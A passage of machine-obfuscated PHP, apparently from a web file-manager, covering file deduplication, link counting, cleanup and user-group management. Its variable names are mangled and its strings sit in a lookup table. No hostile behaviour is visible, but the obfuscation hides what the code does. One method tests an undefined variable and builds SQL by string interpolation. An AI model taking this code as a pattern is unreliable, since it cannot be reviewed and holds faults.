$_SERVER[‚ûòÉ˜ş]; if (!IO::exist($º±¥¨İÊ)) { return !1; } $«á×û¦µ = $¾³öì¢[$–Ô˜×¼¶[649]] ? $¾³öì¢[$–Ô˜×¼¶[649]] : $–Ô˜×¼¶[12]; $éî¤‡º = IO::hashMd5($º±¥¨İÊ, $«á×û¦µ); $Œ˜¼Öó‹ = KodIO::defaultDriver(); $ÖşÅŞÓô = array($–Ô˜×¼¶[593] => IO::size($º±¥¨İÊ), $–Ô˜×¼¶[1946] => 1, $–Ô˜×¼¶[470] => $’°¸îÃ, $–Ô˜×¼¶[848] => $Œ˜¼Öó‹[$–Ô˜×¼¶[451]], $–Ô˜×¼¶[471] => $º±¥¨İÊ, $–Ô˜×¼¶[1947] => $¾³öì¢[$–Ô˜×¼¶[648]] ? $¾³öì¢[$–Ô˜×¼¶[648]] : IO::hashSimple($º±¥¨İÊ), $–Ô˜×¼¶[1948] => $éî¤‡º ? $éî¤‡º : $«á×û¦µ); if ($äöõÊÊÌ = $this->addFileCheckExist($ÖşÅŞÓô[$–Ô˜×¼¶[648]], $ÖşÅŞÓô[$–Ô˜×¼¶[649]], $ÖşÅŞÓô[$–Ô˜×¼¶[86]])) { return $äöõÊÊÌ; } return $this->addFileData($ÖşÅŞÓô); } private function addFileData($¸Œ›¼à) { $ğ²ş¿ù’ =& $_SERVER[‚ûòÉ˜ş]; if (!$¸Œ›¼à) { return !1; } $¸Œ›¼à[$ğ²ş¿ù’[86]] = intval($¸Œ›¼à[$ğ²ş¿ù’[86]]); if (!$¸Œ›¼à[$ğ²ş¿ù’[86]] && strlen($¸Œ›¼à[$ğ²ş¿ù’[648]]) > 32) { $¸Œ›¼à[$ğ²ş¿ù’[86]] = intval(substr($¸Œ›¼à[$ğ²ş¿ù’[648]], 32)); } $·”ƒè–ì = $this->add($¸Œ›¼à); return $this->find($·”ƒè–ì); } public function addFile($ÊŒ¸×Ú, $‚¨Áà¹, $Õ»˜åÂ = false) { $¢®Ìè¢ =& $_SERVER[‚ûòÉ˜ş]; $‚Ùšæù· = IO::hashSimple($ÊŒ¸×Ú); $Ñãå“ƒ° = IO::size($ÊŒ¸×Ú); $¼‹­»Õò = $Ñãå“ƒ° <= 1024 * 1024 * 10 ? IO::hashMd5($ÊŒ¸×Ú) : $¢®Ìè¢[12]; $¬–Í”¥Ó = $¢®Ìè¢[1949] . $‚Ùšæù·; CacheLock::lock($¬–Í”¥Ó); if ($¼‹­»Õò && $‚Ùšæù·) { $ĞìÜûéğ = $this->addFileCheckExist($‚Ùšæù·, $¼‹­»Õò, $Ñãå“ƒ°); if ($ĞìÜûéğ) { CacheLock::unlock($¬–Í”¥Ó); return $ĞìÜûéğ; } } $‡¸´¶É = $this->addFileMake($ÊŒ¸×Ú, $Ñãå“ƒ°, $‚Ùšæù·, $¼‹­»Õò, $‚¨Áà¹, $Õ»˜åÂ); $Šû§ïìæ = $this->addFileData($‡¸´¶É); CacheLock::unlock($¬–Í”¥Ó); if (!$¼‹­»Õò && $Šû§ïìæ) { $this->fileMd5Check($Šû§ïìæ); } return $Šû§ïìæ; } private function fileMd5Check($—ğóâ¶Ö) { $õìâÛ… =& $_SERVER[‚ûòÉ˜ş]; $»‹¹Ù’† = array($—ğóâ¶Ö[$õìâÛ…[517]], $—ğóâ¶Ö[$õìâÛ…[94]]); $ÖâĞğ´ = $õìâÛ…[1950] . $—ğóâ¶Ö[$õìâÛ…[94]]; $Ä­£§ = $õìâÛ…[1951] . $—ğóâ¶Ö[$õìâÛ…[517]]; $’Ï¦Åûş = TaskQueue::add($õìâÛ…[1952], $»‹¹Ù’†, $ÖâĞğ´, $Ä­£§); if (!$’Ï¦Åûş) { $this->fileMd5Set($—ğóâ¶Ö[$õìâÛ…[517]], $—ğóâ¶Ö[$õìâÛ…[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ÜøšûºÀ, $ƒÙ¬æÆ) { $º©Õı¦Û =& $_SERVER[‚ûòÉ˜ş]; $¡·å¨€É = $this->find($ÜøšûºÀ); if (!$¡·å¨€É || $¡·å¨€É[$º©Õı¦Û[649]]) { return; } $ş¸ˆ»‹‘ = IO::hashMd5($ƒÙ¬æÆ); if (!$ş¸ˆ»‹‘) { return $º©Õı¦Û[12]; } $this->where(array($º©Õı¦Û[517] => $ÜøšûºÀ))->save(array($º©Õı¦Û[649] => $ş¸ˆ»‹‘)); } public function addFileMake($¤ğ…ÍÊÑ, $ÔÒúİ•Ÿ, $½Á«‘¡‡, $¯©ıÕ¤ó, $íÍ¶øĞÓ, $Ÿºµ£»ù) { $âÙ„°œ‡ =& $_SERVER[‚ûòÉ˜ş]; $çõë¡Å° = $this->createFileName($íÍ¶øĞÓ, $½Á«‘¡‡, $¯©ıÕ¤ó); $ŞÆ¡êç· = get_path_father($çõë¡Å°); $İúÖ°‹œ = get_path_this($çõë¡Å°); if ($Ÿºµ£»ù) { $¼¬ı´È™ = IO::move($¤ğ…ÍÊÑ, $ŞÆ¡êç·, !1, $İúÖ°‹œ); } else { $¼¬ı´È™ = IO::copy($¤ğ…ÍÊÑ, $ŞÆ¡êç·, !1, $İúÖ°‹œ); } if (!$¼¬ı´È™) { return !1; } $“İı•£Ø = KodIO::defaultDriver(); $äÈŸÏÍ = array($âÙ„°œ‡[593] => $ÔÒúİ•Ÿ, $âÙ„°œ‡[1946] => 1, $âÙ„°œ‡[470] => $íÍ¶øĞÓ, $âÙ„°œ‡[848] => $“İı•£Ø[$âÙ„°œ‡[451]], $âÙ„°œ‡[471] => $çõë¡Å°, $âÙ„°œ‡[1947] => $½Á«‘¡‡, $âÙ„°œ‡[1948] => $¯©ıÕ¤ó); return $äÈŸÏÍ; } public function addFileCheckExist($Û·ªÚ× , $êèº¨ª’, $ÑÙîëæğ) { $’¼æÌ¬ƒ =& $_SERVER[‚ûòÉ˜ş]; $¤¹«š‹ã = $this->findByHash($Û·ªÚ× , $êèº¨ª’); if (!$¤¹«š‹ã) { return !1; } $–•ş«Õ¿ = array($’¼æÌ¬ƒ[1946] => intval($¤¹«š‹ã[$’¼æÌ¬ƒ[1953]]) + 1, $’¼æÌ¬ƒ[593] => $ÑÙîëæğ); $this->where(array($’¼æÌ¬ƒ[518] => $¤¹«š‹ã[$’¼æÌ¬ƒ[517]]))->save($–•ş«Õ¿); return $¤¹«š‹ã; } public function remove($éµŒ£éò) { $this->linkCountChange($éµŒ£éò, !1); $this->clearEmpty(); return !0; } public function linkAdd($Á÷±æ«) { $this->linkCountChange($Á÷±æ«, !0); } public function linkCountChange($û‘î‚ Š, $¯Ù Ò¹Ö) { $Ó½êÍ¤ª =& $_SERVER[‚ûòÉ˜ş]; if (!$û‘î‚ Š) { return; } if (!is_array($û‘î‚ Š)) { $û‘î‚ Š = array($û‘î‚ Š); } $õˆ¢Û÷ = array(); foreach ($û‘î‚ Š as $¸í’Æ„ø) { $–¬Ç´ÅÇ = $¸í’Æ„ø . $Ó½êÍ¤ª[12]; if (!$õˆ¢Û÷[$–¬Ç´ÅÇ]) { $õˆ¢Û÷[$–¬Ç´ÅÇ] = 0; } $õˆ¢Û÷[$–¬Ç´ÅÇ]++; } $øå÷ÁÏ¶ = array(); foreach ($õˆ¢Û÷ as $¸í’Æ„ø => $À‚’É«Ë) { $–¬Ç´ÅÇ = $À‚’É«Ë . $Ó½êÍ¤ª[12]; if (!$øå÷ÁÏ¶[$–¬Ç´ÅÇ]) { $øå÷ÁÏ¶[$–¬Ç´ÅÇ] = array(); } $øå÷ÁÏ¶[$–¬Ç´ÅÇ][] = $¸í’Æ„ø; } foreach ($øå÷ÁÏ¶ as $À‚’É«Ë => $ú±ñÅø) { if (!$ú±ñÅø) { continue; } $À‚’É«Ë = $¯Ù Ò¹Ö ? $À‚’É«Ë : -intval($À‚’É«Ë); $¿ßã†í² = array($Ó½êÍ¤ª[517] => array($Ó½êÍ¤ª[7], $ú±ñÅø)); if ($À‚’É«Ë < 0) { $¿ßã†í²[$Ó½êÍ¤ª[1953]] = array($Ó½êÍ¤ª[1056], abs($À‚’É«Ë)); } $this->where($¿ßã†í²)->setAdd($Ó½êÍ¤ª[1953], $À‚’É«Ë); } } public function findByHash($Ç½óëÑÑ, $é¶é—ğÜ = false) { $›“ã›ıš =& $_SERVER[‚ûòÉ˜ş]; if (!$Ç½óëÑÑ && !$é¶é—ğÜ) { return !1; } $Ğ¨ÛÇ = array($›“ã›ıš[1947] => $Ç½óëÑÑ); if ($é¶é—ğÜ) { $Ğ¨ÛÇ = array($›“ã›ıš[1948] => $é¶é—ğÜ); } return $this->order($›“ã›ıš[1954])->where($Ğ¨ÛÇ)->find(); } public function clearEmpty($İ¿¾½Ô = 0) { $¾®…ˆ‹œ =& $_SERVER[‚ûòÉ˜ş]; $÷Å Ş = time() - 3600 * 24 * $İ¿¾½Ô; $•°¾ƒÎ¡ = $¾®…ˆ‹œ[1955] . $÷Å Ş; $“’å÷” = $this->where($•°¾ƒÎ¡)->select(); if (!$“’å÷”) { return; } $ĞìŸ¹¬İ = new Task($¾®…ˆ‹œ[1956], $¾®…ˆ‹œ[12], count($“’å÷”)); foreach ($“’å÷” as $öóõíœ‹) { $ĞìŸ¹¬İ->update(1); $this->resetFile($öóõíœ‹); } $ĞìŸ¹¬İ->end(); } public function resetFile($™û²ğù) { $’ëˆ¬  =& $_SERVER[‚ûòÉ˜ş]; $¨±¯€±‡ = array($’ëˆ¬ [518] => $™û²ğù[$’ëˆ¬ [517]]); $¸±Õ±Î¤ = Model($’ëˆ¬ [1373])->where($¨±¯€±‡)->count(); $¡Óé¬ı = Model($’ëˆ¬ [1957])->where($¨±¯€±‡)->count(); $á§ë ôÑ = intval($¸±Õ±Î¤) + intval($¡Óé¬ı); if ($á§ë ôÑ == 0) { IO::remove($™û²ğù[$’ëˆ¬ [94]]); Model($’ëˆ¬ [1958])->delete($™û²ğù[$’ëˆ¬ [517]]); $this->where($¨±¯€±‡)->delete(); $this->metaSet($™û²ğù[$’ëˆ¬ [517]], null, null); return; } if ($™û²ğù[$’ëˆ¬ [1953]] != $á§ë ôÑ) { $this->where($¨±¯€±‡)->save(array($’ëˆ¬ [1946] => $á§ë ôÑ)); } } public function storageInfo($“ıÉ¾Õô = false) { $¬–ªßø£ =& $_SERVER[‚ûòÉ˜ş]; $ìÃ‡ıÅ = $this->count() + 0.0; $™™“ı‡Ú = 0; $š™Ñ¢¸³ = 1; $­éÖ¬‰ = 0; $ËÅı‡·ô = 5000; for ($×Äš­Úİ = 0; $×Äš­Úİ < $ìÃ‡ıÅ; $×Äš­Úİ = $×Äš­Úİ + $ËÅı‡·ô) { $“áıï“Ä = $this->limit($×Äš­Úİ, $×Äš­Úİ + $ËÅı‡·ô)->select(); foreach ($“áıï“Ä as $ããÒÒ·ø) { $š™Ñ¢¸³ += $ããÒÒ·ø[$¬–ªßø£[86]] * $ããÒÒ·ø[$¬–ªßø£[1953]]; $™™“ı‡Ú += $ããÒÒ·ø[$¬–ªßø£[86]] * ($ããÒÒ·ø[$¬–ªßø£[1953]] - 1); $­éÖ¬‰ += $ããÒÒ·ø[$¬–ªßø£[1953]]; } } $ìÒŠå‰ = array($¬–ªßø£[1959] => $š™Ñ¢¸³, $¬–ªßø£[1960] => $™™“ı‡Ú, $¬–ªßø£[1961] => $™™“ı‡Ú / $š™Ñ¢¸³, $¬–ªßø£[90] => $ìÃ‡ıÅ, $¬–ªßø£[1962] => $­éÖ¬‰); return $ìÒŠå‰; } } goto eÕ×ÑÁƒ; eÕ×ÑÁƒ: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\x6d\x65" => "\147\x72\x6f\165\x70\137\x6d\x65\164\x61", "\x6d\x65\x74\141\x46\151\145\154\144" => "\147\x72\157\165\x70\x49\104"); protected function cacheFunctionAlias($À¿§òÑ¤) { $åÓ®Ÿ =& $_SERVER[‚ûòÉ˜ş]; return array($åÓ®Ÿ[1963] => array($À¿§òÑ¤[0], $åÓ®Ÿ[1964]), $åÓ®Ÿ[1965] => array($À¿§òÑ¤[0], $åÓ®Ÿ[1966])); } protected function getInfo($òøñ¶ûà, $é¨‚…ÅÍ = false) { $œÒÂ˜·ù = $this->getInfoSimple($òøñ¶ûà); if (!$œÒÂ˜·ù) { return !1; } if ($é¨‚…ÅÍ) { return $this->_listDataApplyItem($œÒÂ˜·ù); } return $this->cacheFunctionGet($_SERVER[‚ûòÉ˜ş][1967], $òøñ¶ûà); } protected function getInfoSimple($”Š„ç£², $¾¢âËÊ¾ = false) { $ñö–™­¸ =& $_SERVER[‚ûòÉ˜ş]; if ($¾¢âËÊ¾) { $“Á„€Ì = array($ñö–™­¸[1885] => intval($”Š„ç£²)); $Æ×½Ç¼ö = $this->where($“Á„€Ì)->find(); return is_array($Æ×½Ç¼ö) ? $Æ×½Ç¼ö : array(); } return $this->cacheFunctionGet($ñö–™­¸[1968], $”Š„ç£²); } protected function groupAdd($ÁªÛÓÂ) { $Ş½¦‡èİ =& $_SERVER[‚ûòÉ˜ş]; if (!$ÁªÛÓÂ[$Ş½¦‡èİ[190]] && isset($ÁªÛÓÂ[$Ş½¦‡èİ[1885]]) && $ÁªÛÓÂ[$Ş½¦‡èİ[1885]] == 1) { if ($Ó±¸—µ› = $this->getInfoSimple($ÁªÛÓÂ[$Ş½¦‡èİ[1885]], !0)) { return $ÁªÛÓÂ[$Ş½¦‡èİ[1885]]; } } else { $Ó±¸—µ› = $this->getInfoSimple($ÁªÛÓÂ[$Ş½¦‡èİ[190]]); if (!$Ó±¸—µ›) { return !1; } } $§²¨Òë‚ = $Ş½¦‡èİ[571]; if ($Ó±¸—µ›[$Ş½¦‡èİ[561]]) { $§²¨Òë‚ = $Ó±¸—µ›[$Ş½¦‡èİ[561]] . $Ó±¸—µ›[$Ş½¦‡èİ[1885]] . $Ş½¦‡èİ[60]; } $ıµşóÒ­ = array($Ş½¦‡èİ[470] => $this->groupNameAuto($ÁªÛÓÂ[$Ş½¦‡èİ[190]], $ÁªÛÓÂ[$Ş½¦‡èİ[42]]), $Ş½¦‡èİ[453] => $ÁªÛÓÂ[$Ş½¦‡èİ[190]], $Ş½¦‡èİ[628] => $§²¨Òë‚, $Ş½¦‡èİ[1969] => $ÁªÛÓÂ[$Ş½¦‡èİ[1872]], $Ş½¦‡èİ[1970] => 0, $Ş½¦‡èİ[1889] => 0); if (isset($ÁªÛÓÂ[$Ş½¦‡èİ[1909]])) { $ıµşóÒ­[$Ş½¦‡èİ[1909]] = $ÁªÛÓÂ[$Ş½¦‡èİ[1909]]; } else { $ĞºĞŒ…÷ = $this->max($Ş½¦‡èİ[1909]); if (!$ĞºĞŒ…÷) { $ĞºĞŒ…÷ = 0; } $ıµşóÒ­[$Ş½¦‡èİ[1909]] = $ĞºĞŒ…÷ + 1; } if (!empty($ÁªÛÓÂ[$Ş½¦‡èİ[1885]])) { $ıµşóÒ­[$Ş½¦‡èİ[1885]] = $ÁªÛÓÂ[$Ş½¦‡èİ[1885]]; } $§í‚å¢› = $this->add($ıµşóÒ­); $this->setNamePinyin($§í‚å¢›, $ıµşóÒ­[$Ş½¦‡èİ[42]]); if (isset($ÁªÛÓÂ[$Ş½¦‡èİ[1971]])) { $this->metaSet($§í‚å¢›, array($Ş½¦‡èİ[1971] => $ÁªÛÓÂ[$Ş½¦‡èİ[1971]], $Ş½¦‡èİ[1972] => $ÁªÛÓÂ[$Ş½¦‡èİ[1972]])); unset($ÁªÛÓÂ[$Ş½¦‡èİ[1971]]); unset($ÁªÛÓÂ[$Ş½¦‡èİ[1972]]); } Model($Ş½¦‡èİ[1373])->groupRootAdd($§í‚å¢›); $this->_clearCache($ÁªÛÓÂ[$Ş½¦‡èİ[190]]); return $§í‚å¢›; } protected function groupEdit($ûˆ°ÚŞÉ, $³³áëÕ) { $‡ä¦ı§ =& $_SERVER[‚ûòÉ˜ş]; $îï‚Ğ‡¤ = $this->getInfoSimple($ûˆ°ÚŞÉ); if (!$îï‚Ğ‡¤) { return !1; } if (!empty($³³áëÕ[$‡ä¦ı§[190]])) { $…¶ÎÎïâ = $this->getInfoSimple($³³áëÕ[$‡ä¦ı§[190]]); if (!$…¶ÎÎïâ) { return !1; } if ($îï‚Ğ‡¤[$‡ä¦ı§[1885]] == $…¶ÎÎïâ[$‡ä¦ı§[1885]]) { return !1; } if ($³³áëÕ[$‡ä¦ı§[190]] != $îï‚Ğ‡¤[$‡ä¦ı§[190]]) { if ($…¶ÎÎïâ[$‡ä¦ı§[561]] !== $îï‚Ğ‡¤[$‡ä¦ı§[561]] && strpos($…¶ÎÎïâ[$‡ä¦ı§[561]], $îï‚Ğ‡¤[$‡ä¦ı§[561]] . $îï‚Ğ‡¤[$‡ä¦ı§[1885]] . $‡ä¦ı§[60]) === 0) { return !1; } $³³áëÕ[$‡ä¦ı§[628]] = $…¶ÎÎïâ[$‡ä¦ı§[561]] . $³³áëÕ[$‡ä¦ı§[190]] . $‡ä¦ı§[60]; $this->_changeChildLevel($îï‚Ğ‡¤, $…¶ÎÎïâ); $this->_clearCache($…¶ÎÎïâ[$‡ä¦ı§[1885]]); $this->_clearCache($îï‚Ğ‡¤[$‡ä¦ı§[190]]); } } if (isset($³³áëÕ[$‡ä¦ı§[42]])) { $this->setNamePinyin($ûˆ°ÚŞÉ, $³³áëÕ[$‡ä¦ı§[42]]); } if (isset($³³áëÕ[$‡ä¦ı§[1971]])) { $this->metaSet($ûˆ°ÚŞÉ, array($‡ä¦ı§[1971] => $³³áëÕ[$‡ä¦ı§[1971]], $‡ä¦ı§[1972] => $³³áëÕ[$‡ä¦ı§[1972]])); unset($³³áëÕ[$‡ä¦ı§[1971]]); unset($³³áëÕ[$‡ä¦ı§[1972]]); } $this->_clearChildrenCache($îï‚Ğ‡¤); return $this->where(array($‡ä¦ı§[1973] => $ûˆ°ÚŞÉ))->save($³³áëÕ); } private function _clearChildrenCache($ºİ‚ù•‘) { $ÉËßûú‘ =& $_SERVER[‚ûòÉ˜ş]; $ñ—û±æ“ = array($ÉËßûú‘[628] => array($ÉËßûú‘[588], $ºİ‚ù•‘[$ÉËßûú‘[561]] . $ºİ‚ù•‘[$ÉËßûú‘[1885]] . $ÉËßûú‘[589])); $Ğ´ÎÊÇ = $this->field($ÉËßûú‘[1885])->where($ñ—û±æ“)->select(); foreach ($Ğ´ÎÊÇ as $ùºÛ·ô) { $this->_clearCache($ùºÛ·ô[$ÉËßûú‘[1885]]); } } private function _clearCache($ËßùÔ«’) { $‡ÄØú· =& $_SERVER[‚ûòÉ˜ş]; $this->cacheFunctionClear($‡ÄØú·[1967], $ËßùÔ«’); $this->cacheFunctionClear($‡ÄØú·[1968], $ËßùÔ«’); } private function _changeChildLevel($’ôÃòç’, $ûƒ¯Ûº, $•¯æöş• = false) { $®¨¥ˆç› =& $_SERVER[‚ûòÉ˜ş]; $¶´‡ÀÀô = $’ôÃòç’[$®¨¥ˆç›[561]] . $’ôÃòç’[$®¨¥ˆç›[1885]] . $®¨¥ˆç›[60]; $ƒ…ÛÃ = $ûƒ¯Ûº[$®¨¥ˆç›[561]] . $ûƒ¯Ûº[$®¨¥ˆç›[1885]] . $®¨¥ˆç›[60] . $’ôÃòç’[$®¨¥ˆç›[1885]] . $®¨¥ˆç›[60]; if ($•¯æöş•) { $ƒ…ÛÃ = $ûƒ¯Ûº[$®¨¥ˆç›[561]] . $ûƒ¯Ûº[$®¨¥ˆç›[1885]] . $®¨¥ˆç›[60]; } $Ï¯…Åì¹ = array($®¨¥ˆç›[628] => array($®¨¥ˆç›[588], $’ôÃòç’[$®¨¥ˆç›[561]] . $’ôÃòç’[$®¨¥ˆç›[1885]] . $®¨¥ˆç›[589])); $€ÊšÑ›¶ = array($®¨¥ˆç›[628] => array($®¨¥ˆç›[637], "\162\x65\x70\154\141\143\x65\x28\160\x61\x72\x65\x6e\x74\114\145\x76\145\154\x2c\x27{$¶´‡ÀÀô}\47\x2c\47{$ƒ…ÛÃ}\x27\x29")); $this->_clearChildrenCache($’ôÃòç’); $this->where($Ï¯…Åì¹)->data($€ÊšÑ›¶)->save(); } public function setNamePinyin($ıËˆù, $‹¦ü™½ = false) { $ éü¹üó =& $_SERVER[‚ûòÉ˜ş]; if (!$‹¦ü™½) { $‰ÃäİùÈ = $this->getInfoSimple($ıËˆù); $‹¦ü™½ = $‰ÃäİùÈ[$ éü¹üó[42]]; } if (!Input::check($‹¦ü™½, $ éü¹üó[631])) { $this->metaSet($ıËˆù, $ éü¹üó[514], null); $this->metaSet($ıËˆù, $ éü¹üó[513], null); return; } $‚ô¯’ÏÊ = array($ éü¹üó[514] => str_replace($ éü¹üó[63], $ éü¹üó[12], Pinyin::get($‹¦ü™½)), $ éü¹üó[513] => Pinyin::get($‹¦ü™½, $ éü¹üó[632])); $this->metaSet($ıËˆù, $‚ô¯’ÏÊ); } protected function groupStatus($¯¼óää¢, $€à³ÀÛß) { $¢Ú€˜Ï¦ =& $_SERVER[‚ûòÉ˜ş]; $Û‹—æÓš = $this->getInfoSimple($¯¼óää¢); if (!$Û‹—æÓš) { return !1; } if ($€à³ÀÛß == $¢Ú€˜Ï¦[98]) { $ÛéÓ»ÃÊ = $this->parentLevelArray($Û‹—æÓš[$¢Ú€˜Ï¦[561]]); } else { $üÚÃìÑÏ = array($¢Ú€˜Ï¦[628] => array($¢Ú€˜Ï¦[588], $Û‹—æÓš[$¢Ú€˜Ï¦[561]] . $Û‹—æÓš[$¢Ú€˜Ï¦[1885]] . $¢Ú€˜Ï¦[589])); $ÛéÓ»ÃÊ = $this->where($üÚÃìÑÏ)->field($¢Ú€˜Ï¦[1885])->select(); $ÛéÓ»ÃÊ = array_to_keyvalue($ÛéÓ»ÃÊ, $¢Ú€˜Ï¦[12], $¢Ú€˜Ï¦[1885]); } $ÛéÓ»ÃÊ[] = $Û‹—æÓš[$¢Ú€˜Ï¦[1885]]; $àÏÕ³Â = array(); foreach ($ÛéÓ»ÃÊ as $¯¼óää¢) { $àÏÕ³Â[] = array($¢Ú€˜Ï¦[1885] => $¯¼óää¢, $¢Ú€˜Ï¦[104] => $¢Ú€˜Ï¦[790], $¢Ú€˜Ï¦[427] => $€à³ÀÛß); $this->_clearCache($¯¼óää¢); } return Model($¢Ú€˜Ï¦[1974])->addAll($àÏÕ³Â, array(), !0); } protected function groupRemove($À÷•’Ê, $ê¤ŠŞ‚Á = false) { $ûê“‚øé =& $_SERVER[‚ûòÉ˜ş]; $²ï³ÔÇ = array($ûê“‚øé[1885] => $À÷•’Ê); $ä®Êıå = $this->where($²ï³ÔÇ)->find(); if (!$ä®Êıå || $ä®Êıå[$ûê“‚øé[190]] == 0) { return !1; } if (!$ê¤ŠŞ‚Á) { $Ï¦µ = $this->getInfoSimple($ä®Êıå[$ûê“‚øé[190]]); $this->_changeChildLevel($ä®Êıå, $Ï¦µ, !0); $this->where(array($ûê“‚øé[190] => $À÷•’Ê))->save(array($ûê“‚øé[190] => $ä®Êıå[$ûê“‚øé[190]])); $this->_clearCache($Ï¦µ[$ûê“‚øé[1885]]); } Model($ûê“‚øé[1974])->where($²ï³ÔÇ)->delete(); Model($ûê“‚øé[1975])->where($²ï³ÔÇ)->delete(); Model($ûê“‚øé[865])->groupRootRemove($À÷•’Ê); $this->_clearCache($ä®Êıå[$ûê“‚øé[190]]); return $this->where($²ï³ÔÇ)->delete(); } protected function groupSort($Ü‹¤…´Ğ) { $¾ùŸŒ¥Ÿ =& $_SERVER[‚ûòÉ˜ş]; $Çæ÷ÁÅ = array(); foreach ($Ü‹¤…´Ğ as $Šüğ˜¢Ù => $ È†ÅŠå) { $Çæ÷ÁÅ[] = array($¾ùŸŒ¥Ÿ[1885], $ È†ÅŠå, $¾ùŸŒ¥Ÿ[1909], $Šüğ˜¢Ù + 1); } $this->saveAll($Çæ÷ÁÅ); } public function listData() { $¬ÊØ±½¥ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¬ÊØ±½¥[$_SERVER[‚ûòÉ˜ş][422]]); return $¬ÊØ±½¥; } private function _makeOrder($Ê¼›áöŠ = '') { $ô¥šŒß =& $_SERVER[‚ûòÉ˜ş]; $³ğÂ®ş© = array($ô¥šŒß[1885], $ô¥šŒß[42], $ô¥šŒß[1874], $ô¥šŒß[225]); $ØÂ“’˜Ø = array($ô¥šŒß[499] => $ô¥šŒß[500], $ô¥šŒß[501] => $ô¥šŒß[502]); $ŠşµŒÒ³ = Input::get($ô¥šŒß[506], $ô¥šŒß[7], $ô¥šŒß[1889], $³ğÂ®ş©); $š«©ÑİÙ = Input::get($ô¥šŒß[507], $ô¥šŒß[7], $ô¥šŒß[1976], array($ô¥šŒß[1976], $ô¥šŒß[501])); $š«©ÑİÙ = $ØÂ“’˜Ø[$š«©ÑİÙ]; $Ê¼›áöŠ = $Ê¼›áöŠ . "{$ŠşµŒÒ³}\40{$š«©ÑİÙ}\x2c\40\x67\x72\x6f\165\160\111\104\x20\x61\163\x63"; return $this->order($Ê¼›áöŠ); } public function listChild($Øó„ö§ì) { $›ôŒ×ìÔ =& $_SERVER[‚ûòÉ˜ş]; $ìÍ˜¶ê© = $this->where(array($›ôŒ×ìÔ[190] => $Øó„ö§ì))->_makeOrder()->selectPage(200); $this->_listDataApply($ìÍ˜¶ê©[$›ôŒ×ìÔ[422]]); return $ìÍ˜¶ê©; } public function listChildIds($è¶ìËÊ) { $ûÅËôä =& $_SERVER[‚ûòÉ˜ş]; if (is_string($û¸ûí½À)) { $è¶ìËÊ = explode($ûÅËôä[60], $è¶ìËÊ); } $¦ÊúÒ·­ = $this->where(array($ûÅËôä[1885] => array($ûÅËôä[7], $è¶ìËÊ)))->field($ûÅËôä[1977])->select(); if (!$¦ÊúÒ·­) { return !1; } $ïêà†…Î = array(); foreach ($¦ÊúÒ·­ as $Èù•Ô›²) { $ïêà†…Î[] = "\x73\145\x6c\145\x63\x74\40\x67\162\157\x75\x70\111\x44\x20\x66\x72\157\x6d\x20\140\147\x72\x6f\165\x70\140\x20\167\150\x65\162\x65\x20\160\141\x72\x65\x6e\x74\114\145\x76\145\x6c\40\154\x69\153\145\x20\x27{$Èù•Ô›²[$ûÅËôä[561]]}{$Èù•Ô›²[$ûÅËôä[1885]]}\x2c\45\x27"; } $ïêà†…Î = implode($ûÅËôä[1978], $ïêà†…Î); $¦ÊúÒ·­ = $this->query($ïêà†…Î); if (!$¦ÊúÒ·­) { return array(); } $è¶ìËÊ = array_to_keyvalue($¦ÊúÒ·­, $ûÅËôä[12], $ûÅËôä[1885]); return array_unique($è¶ìËÊ); } public function listByID($ ­÷Äç) { $§í·–öš =& $_SERVER[‚ûòÉ˜ş]; if (!$ ­÷Äç) { return array(); } $Ã§§›Çİ = array($§í·–öš[1885] => array($§í·–öš[7], $ ­÷Äç)); $İØŠ”¤Ç = $this->where($Ã§§›Çİ)->select(); $İØŠ”¤Ç = array_sort_keep($İØŠ”¤Ç, $§í·–öš[1885], $ ­÷Äç); $this->_listDataApply($İØŠ”¤Ç); return $İØŠ”¤Ç; } public function listSearch($††íÌ¨¾) { $™¦êŒµ =& $_SERVER[‚ûòÉ˜ş]; $ğÙÎÎ²æ = $††íÌ¨¾[$™¦êŒµ[1979]]; $àôÏø–€ = isset($††íÌ¨¾[$™¦êŒµ[1980]]) ? $††íÌ¨¾[$™¦êŒµ[1980]] : !1; if (!trim($ğÙÎÎ²æ)) { return !1; } $ğÙÎÎ²æ = str_replace($™¦êŒµ[1981], $™¦êŒµ[1982], $ğÙÎÎ²æ); $ò¦“Ö’Ş = array($™¦êŒµ[1885] => array($™¦êŒµ[435], "{$ğÙÎÎ²æ}\x25"), $™¦êŒµ[42] => array($™¦êŒµ[435], "\x25{$ğÙÎÎ²æ}\45"), $™¦êŒµ[1041] => $™¦êŒµ[1983]); if ($àôÏø–€) { $† ùùö = $this->getInfoSimple($àôÏø–€); $ñüŞâƒ® = $† ùùö[$™¦êŒµ[561]] . $àôÏø–€ . $™¦êŒµ[589]; $ò¦“Ö’Ş = array($ò¦“Ö’Ş, array($™¦êŒµ[561] => array($™¦êŒµ[435], $ñüŞâƒ®))); } $ò¦“Ö’Ş = $this->parseWhereLike($ò¦“Ö’Ş); $„Œéø÷ = $this->_makeOrder()->where($ò¦“Ö’Ş)->selectPage(20); $„Œéø÷ = $„Œéø÷ ? $„Œéø÷ : array($™¦êŒµ[422] => array(), $™¦êŒµ[419] => array()); if (!$„Œéø÷ || count($„Œéø÷[$™¦êŒµ[422]]) < 5 && Input::check($ğÙÎÎ²æ, $™¦êŒµ[371])) { $ ıí‹×™ = $this->groupChildrenAll($àôÏø–€); $ßÁ¡ş™š = $this->_searchFromMeta($™¦êŒµ[513], $ğÙÎÎ²æ, 10, $ ıí‹×™); $˜†€Ù = $this->_searchFromMeta($™¦êŒµ[514], $ğÙÎÎ²æ, 10, $ ıí‹×™); $˜ú¹é°á = array_merge($ßÁ¡ş™š, $˜†€Ù, $„Œéø÷[$™¦êŒµ[422]]); $„Œéø÷[$™¦êŒµ[422]] = array_unique_by_key($˜ú¹é°á, $™¦êŒµ[1885]); $„Œéø÷[$™¦êŒµ[419]][$™¦êŒµ[420]] = count($„Œéø÷[$™¦êŒµ[422]]); $„Œéø÷[$™¦êŒµ[419]][$™¦êŒµ[421]] = ceil($„Œéø÷[$™¦êŒµ[419]][$™¦êŒµ[420]] / $„Œéø÷[$™¦êŒµ[419]][$™¦êŒµ[416]]); } $this->_listDataApply($„Œéø÷[$™¦êŒµ[422]]); return $„Œéø÷; } protected function groupChildrenAll($«ğ¬şµ¾) { $æîÕç˜² =& $_SERVER[‚ûòÉ˜ş]; if (!$«ğ¬şµ¾) { return !1; } if (!is_array($«ğ¬şµ¾)) { 